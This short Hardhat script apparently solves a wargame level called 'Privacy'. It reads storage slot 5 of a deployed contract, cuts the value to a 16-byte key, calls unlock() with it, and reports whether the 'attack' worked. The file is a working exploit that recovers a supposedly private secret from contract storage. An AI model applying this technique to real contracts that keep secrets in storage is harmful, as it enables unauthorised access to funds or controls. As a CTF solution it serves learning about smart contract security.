import { ethers } from "hardhat";

const INSTANCE = "0x3dE9334CD447D013a38dBA386f0450B59984e53c";

async function main() {
  const privacy = await ethers.getContractAt("Privacy", INSTANCE);
  const data = await ethers.provider.getStorageAt(INSTANCE, 5);

  const callData = data.slice(0, 34);

  console.log(callData);

  const tx = await privacy.unlock(callData);
  await tx.wait();
  (await privacy.locked()) === false
    ? console.log("Successfully attack the contract")
    : console.log("Attack contract failed");
}

main().catch((err) => {
  console.error(err);
  process.exitCode = 1;
});
